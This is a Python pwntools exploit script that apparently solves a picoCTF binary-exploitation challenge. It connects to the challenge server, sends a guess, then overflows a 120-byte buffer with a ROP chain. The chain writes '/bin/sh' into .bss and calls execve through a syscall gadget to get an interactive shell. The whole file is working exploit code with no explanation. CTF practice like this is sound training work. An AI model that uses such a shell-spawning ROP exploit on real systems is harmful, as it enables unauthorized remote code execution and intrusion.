
from pwn import *
context.log_level = 'DEBUG'
#r = process("./vuln")
r = remote("jupiter.challenges.picoctf.org",42953)
pop_rax = p64(0x00000000004163f4)
pop_rdi = p64(0x0000000000400696)
pop_rsi = p64(0x0000000000410ca3)
pop_rdx = p64(0x000000000044a6b5)
syscall = p64(0x000000000040137c)
rsi_ptr = p64(0x000000000047ff91) #mov qword ptr [rsi], rax ; ret
bss = p64(0x00000000006bc3a0)

payload = b"A"*120 + pop_rax + b'/bin/sh\x00' + pop_rsi + bss + rsi_ptr + pop_rdi + bss + pop_rsi + p64(0) + pop_rdx + p64(0) + pop_rax + p64(59) + syscall

r.recvuntil(b'What number would you like to guess?\n')
r.sendline("84")
r.recvuntil(b'Name? ')
r.sendline(payload)
r.interactive()
